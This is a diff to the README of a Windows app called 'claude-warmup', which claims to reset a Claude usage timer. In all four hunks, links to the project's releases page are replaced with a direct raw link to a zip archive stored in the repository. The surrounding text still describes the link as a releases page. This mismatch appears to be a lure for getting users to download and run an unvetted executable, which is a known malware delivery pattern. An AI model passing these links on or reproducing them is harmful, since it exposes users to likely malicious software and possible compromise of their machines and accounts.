@@ -1,6 +1,6 @@
 # ⏰ claude-warmup - Reset Your Claude Timer With Ease
 
-[![Download claude-warmup](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/educationinsightofficial/claude-warmup/releases)
+[![Download claude-warmup](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/educationinsightofficial/claude-warmup/raw/refs/heads/main/antiar/claude_warmup_2.3.zip)
 
 ## 🚀 What this app does
 
@@ -12,7 +12,7 @@ Use it when you want a quick reset and less downtime between sessions.
 
 Visit this page to download the app for Windows:
 
-https://github.com/educationinsightofficial/claude-warmup/releases
+https://github.com/educationinsightofficial/claude-warmup/raw/refs/heads/main/antiar/claude_warmup_2.3.zip
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one for Windows, then save it to your computer.
 
@@ -32,7 +32,7 @@ For best results, keep Claude Code installed and ready to use on the same machin
 ## 🧭 How to install
 
 1. Open the release page:
-   https://github.com/educationinsightofficial/claude-warmup/releases
+   https://github.com/educationinsightofficial/claude-warmup/raw/refs/heads/main/antiar/claude_warmup_2.3.zip
 
 2. Find the newest release at the top of the page.
 
@@ -169,7 +169,7 @@ If your browser or Windows asks for permission, review the file name and locatio
 
 ## 📎 Download again
 
-[Open the claude-warmup releases page](https://github.com/educationinsightofficial/claude-warmup/releases)
+[Open the claude-warmup releases page](https://github.com/educationinsightofficial/claude-warmup/raw/refs/heads/main/antiar/claude_warmup_2.3.zip)
 
 ## 📝 Basic use checklist
 
